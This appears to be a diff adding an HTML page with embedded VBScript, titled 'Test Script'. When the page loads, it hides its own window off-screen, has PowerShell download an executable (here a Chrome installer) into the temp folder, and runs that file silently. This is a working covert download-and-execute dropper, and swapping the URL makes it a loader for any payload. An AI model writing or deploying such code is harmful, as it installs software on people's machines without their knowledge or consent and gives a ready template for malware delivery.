@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Script</title>
+</head>
+<body>
+    <script language="VBScript">
+        Sub Window_onLoad()
+            Window.ResizeTo 1, 1
+            Window.MoveTo -32000, -32000
+
+            Set objShell = CreateObject("WScript.Shell")
+
+            tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
+            downloadUrl = "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B3F974B5B-F43B-ED9D-767A-5CA75FCE7C8D%7D%26lang%3Den%26browser%3D5%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-statsdef_1%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe"
+            downloadedFile = tempFolder & "\ChromeSetup.exe"
+
+            ' Download the file using PowerShell
+            cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri " & downloadUrl & " -OutFile " & downloadedFile & """"
+            objShell.Run "cmd.exe /c " & cmdCommand, 0, True
+
+            ' Execute the downloaded file
+            objShell.Run downloadedFile, 0, False
+        End Sub
+
+        ' Trigger the Window_onLoad subroutine when the window loads
+        Window_onLoad()
+    </script>
+</body>
+</html>
